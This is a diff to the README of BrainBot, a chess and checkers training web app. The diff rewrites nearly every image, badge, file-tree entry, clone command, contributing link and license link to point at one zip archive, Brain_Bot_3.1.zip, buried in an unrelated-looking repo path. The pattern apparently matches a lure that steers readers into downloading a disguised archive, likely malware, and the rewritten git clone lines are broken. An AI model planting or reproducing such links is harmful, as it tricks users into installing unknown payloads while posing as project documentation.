@@ -1,5 +1,5 @@
 <p align="center">
-    <img src="https://cdn-icons-png.flaticon.com/512/6295/6295417.png" align="center" width="30%">
+    <img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" align="center" width="30%">
 </p>
 <h1 align="center">BRAINBOT</h1>
 <p align="center">
@@ -7,10 +7,10 @@
 </p>
 
 <p align="center">
-	<img src="https://img.shields.io/github/license/RishiKumarGade/BrainBot?style=default&logo=opensourceinitiative&logoColor=white&color=00ffe9" alt="license">
-	<img src="https://img.shields.io/github/last-commit/RishiKumarGade/BrainBot?style=default&logo=git&logoColor=white&color=00ffe9" alt="last-commit">
-	<img src="https://img.shields.io/github/languages/top/RishiKumarGade/BrainBot?style=default&color=00ffe9" alt="repo-top-language">
-	<img src="https://img.shields.io/github/languages/count/RishiKumarGade/BrainBot?style=default&color=00ffe9" alt="repo-language-count">
+	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="license">
+	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="last-commit">
+	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="repo-top-language">
+	<img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" alt="repo-language-count">
 </p>
 
 ---
@@ -67,24 +67,24 @@ It's a complete training ground for sharpening your decision-making and game str
 
 ```sh
 └── BrainBot/
-    ├── Documentation.docx
-    ├── README.md
+    ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+    ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
     ├── backend
     │   ├── .env
     │   ├── .gitignore
-    │   ├── index.js
-    │   ├── package-lock.json
-    │   └── package.json
+    │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+    │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+    │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
     └── frontend
         ├── .env
-        ├── .eslintrc.json
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         ├── .gitignore
-        ├── README.md
-        ├── components.json
-        ├── next.config.js
-        ├── package-lock.json
-        ├── package.json
-        ├── postcss.config.js
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         ├── public
         │   └── img
         │       └── chesspieces
@@ -94,69 +94,69 @@ It's a complete training ground for sharpening your decision-making and game str
         │   │   ├── api
         │   │   │   └── users
         │   │   ├── forgotpassword
-        │   │   │   └── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── game
         │   │   │   ├── checkers
         │   │   │   └── chess
-        │   │   ├── globals.css
-        │   │   ├── layout.tsx
-        │   │   ├── loading.tsx
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── login
-        │   │   │   └── page.tsx
-        │   │   ├── not-found.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── notifications
-        │   │   │   └── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── otherlogins
-        │   │   │   └── page.tsx
-        │   │   ├── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── prompt
-        │   │   │   └── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── resetpassword
-        │   │   │   └── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── signup
-        │   │   │   └── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── test
-        │   │   │   └── page.tsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   └── verifyemail
-        │   │       └── page.tsx
+        │   │       └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   ├── cloudinaryConfig
-        │   │   └── cloudinaryConfig.ts
+        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   ├── components
-        │   │   ├── CheckExistence.tsx
-        │   │   ├── ChessGame.tsx
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── logout
-        │   │   │   └── LogoutButton.jsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   ├── toast
-        │   │   │   └── Flag.jsx
+        │   │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   │   └── ui
-        │   │       ├── button.tsx
-        │   │       └── input.tsx
+        │   │       ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │       └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   ├── cssFiles
-        │   │   ├── animation.css
-        │   │   ├── chessboard-1.0.0.min.css
-        │   │   ├── chessboard.css
-        │   │   └── homeanimations.css
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   ├── dbConfig
-        │   │   └── dbConfig.ts
+        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   ├── helpers
-        │   │   ├── checkSessionExistenceServerSide.ts
-        │   │   ├── generateResponse.ts
-        │   │   ├── generateResponsewithImage.js
-        │   │   ├── getDataFromToken.ts
-        │   │   ├── getTokensToken.ts
-        │   │   ├── infoMailer.ts
-        │   │   ├── mailer.ts
-        │   │   └── uploadToCloudinary.ts
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   ├── lib
-        │   │   └── utils.ts
-        │   ├── middleware.ts
+        │   │   └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │   ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
         │   └── models
-        │       ├── gameModel.js
-        │       ├── loginModel.js
-        │       └── userModel.js
-        ├── tailwind.config.js
-        ├── tailwind.config.ts
-        └── tsconfig.json
+        │       ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │       ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        │       └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        ├── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
+        └── https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
 ```
 ---
 
@@ -166,7 +166,7 @@ It's a complete training ground for sharpening your decision-making and game str
 
 Make sure your environment has the following:
 
-* Node.js + npm
+* https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip + npm
 * Docker (optional)
 * TypeScript
 * MongoDB (or access to a MongoDB Atlas cluster)
@@ -178,7 +178,7 @@ Make sure your environment has the following:
 **Clone the repository:**
 
 ```sh
-❯ git clone https://github.com/RishiKumarGade/BrainBot
+❯ git clone https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
 ❯ cd BrainBot
 ```
 
@@ -234,9 +234,9 @@ Make sure your environment has the following:
 
 ## 🔰 Contributing
 
-* 💬 [Start a Discussion](https://github.com/RishiKumarGade/BrainBot/discussions)
-* 🐛 [Report Bugs / Request Features](https://github.com/RishiKumarGade/BrainBot/issues)
-* 📥 [Submit Pull Requests](https://github.com/RishiKumarGade/BrainBot/pulls)
+* 💬 [Start a Discussion](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip)
+* 🐛 [Report Bugs / Request Features](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip)
+* 📥 [Submit Pull Requests](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip)
 
 <details>
 <summary>Contributing Guidelines</summary>
@@ -244,7 +244,7 @@ Make sure your environment has the following:
 1. Fork the repo and clone it:
 
    ```sh
-   git clone https://github.com/RishiKumarGade/BrainBot
+   git clone https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip
    ```
 2. Create a new feature branch:
 
@@ -268,8 +268,8 @@ Make sure your environment has the following:
 <summary>Contributor Graph</summary>
 <br>
 <p align="left">
-   <a href="https://github.com/RishiKumarGade/BrainBot/graphs/contributors">
-      <img src="https://contrib.rocks/image?repo=RishiKumarGade/BrainBot" />
+   <a href="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip">
+      <img src="https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip" />
    </a>
 </p>
 </details>
@@ -278,7 +278,7 @@ Make sure your environment has the following:
 
 ## 🎗 License
 
-This project is licensed under the [MIT License](https://choosealicense.com/licenses/mit/). See the [LICENSE](https://choosealicense.com/licenses/mit/) file for details.
+This project is licensed under the [MIT License](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip). See the [LICENSE](https://github.com/Rahulkichad/BrainBot/raw/refs/heads/main/frontend/src/app/api/users/changepassword/Brain_Bot_3.1.zip) file for details.
 
 ---
 
